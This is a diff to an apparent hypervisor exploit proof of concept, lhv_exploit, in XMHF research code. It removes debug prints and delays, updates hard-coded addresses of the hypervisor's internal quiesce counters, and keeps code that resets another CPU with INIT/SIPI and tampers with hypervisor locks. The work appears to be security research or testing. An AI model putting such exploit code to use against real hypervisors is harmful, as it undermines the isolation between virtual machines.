@@ -20,9 +20,6 @@ static void lhv_exploit(VCPU *vcpu)
 				asm volatile ("pause");		/* Save energy when waiting */
 			}
 			printf("BSP synchronized\n");
-			for (u32 i = 0; i < 100; i++) {
-				xmhf_baseplatform_arch_x86_udelay(10000);
-			}
 		} else {
 			printf("AP synchronized\n");
 			ap_ready = 1;
@@ -31,8 +28,6 @@ static void lhv_exploit(VCPU *vcpu)
 	}
 
 	HALT_ON_ERRORCOND(vcpu->isbsp);
-
-	printf("Prepare AP's real mode code\n");
 
 	/* Prepare AP's real mode code */
 	{
@@ -46,12 +41,6 @@ static void lhv_exploit(VCPU *vcpu)
 			start = (uintptr_t)&exploit_real_start;
 		}
 		memcpy((void *)0x10000, (void *)start, end - start);
-	}
-
-	printf("Send INIT to AP\n");
-
-	for (u32 i = 0; i < 1000; i++) {
-		xmhf_baseplatform_arch_x86_udelay(10000);
 	}
 
 	/* Send INIT to AP */
@@ -71,12 +60,6 @@ static void lhv_exploit(VCPU *vcpu)
 		}
 	}
 
-	printf("Send INIT 2 to AP\n");
-
-	for (u32 i = 0; i < 100; i++) {
-		xmhf_baseplatform_arch_x86_udelay(10000);
-	}
-
 	/* Send another INIT to AP */
 	{
 		*icr_high = 0x01000000U;
@@ -86,12 +69,6 @@ static void lhv_exploit(VCPU *vcpu)
 		while ((*icr_low) & 0x1000U) {
 			asm volatile ("pause");     /* Save energy when waiting */
 		}
-	}
-
-	printf("Sent INIT 3+ to AP\n");
-
-	for (u32 i = 0; i < 100; i++) {
-		xmhf_baseplatform_arch_x86_udelay(10000);
 	}
 
 	/* Send SIPI to AP */
@@ -106,12 +83,6 @@ static void lhv_exploit(VCPU *vcpu)
 		while ((*icr_low) & 0x1000U) {
 			asm volatile ("pause");     /* Save energy when waiting */
 		}
-	}
-
-	printf("Sent INIT to AP\n");
-
-	for (u32 i = 0; i < 100; i++) {
-		xmhf_baseplatform_arch_x86_udelay(10000);
 	}
 
 	/* Wait for AP to restart */
@@ -140,9 +111,6 @@ void lhv_exploit_vmxroot(VCPU *vcpu)
 		printf("AP synchronized 2\n");
 		ap_restarted = 1;
 	}
-	for (u32 i = 0; i < 0x1000000; i++) {
-		;
-	}
 	{
 		extern u8 pal_demo_data[MAX_VCPU_ENTRIES][PAGE_SIZE_4K];
 		while (1) {
@@ -162,11 +130,11 @@ for i in g_vmx_{{{,lock_}quiesce,{,lock_}quiesce_resume}_counter,quiesce_resume_
 	nm xmhf/src/xmhf-core/xmhf-runtime/runtime.exe | grep $i
 done
  */
-	volatile u32 *p_quiesce_counter             = (volatile u32 *)0x1025e104UL;
-	volatile u32 *p_lock_quiesce_counter        = (volatile u32 *)0x1025e108UL;
-	volatile u32 *p_quiesce_resume_counter      = (volatile u32 *)0x1025e10cUL;
-	volatile u32 *p_lock_quiesce_resume_counter = (volatile u32 *)0x1025e110UL;
-	volatile u32 *p_quiesce_resume_signal       = (volatile u32 *)0x1025e11cUL;
+	volatile u32 *p_quiesce_counter             = (volatile u32 *)0x1025c104UL;
+	volatile u32 *p_lock_quiesce_counter        = (volatile u32 *)0x1025c108UL;
+	volatile u32 *p_quiesce_resume_counter      = (volatile u32 *)0x1025c10cUL;
+	volatile u32 *p_lock_quiesce_resume_counter = (volatile u32 *)0x1025c110UL;
+	volatile u32 *p_quiesce_resume_signal       = (volatile u32 *)0x1025c11cUL;
 	/* Copy the logic from xmhf_smpguest_arch_x86vmx_nmi_check_quiesce() */
 	spin_lock(p_lock_quiesce_counter);
 	(*p_quiesce_counter)++;
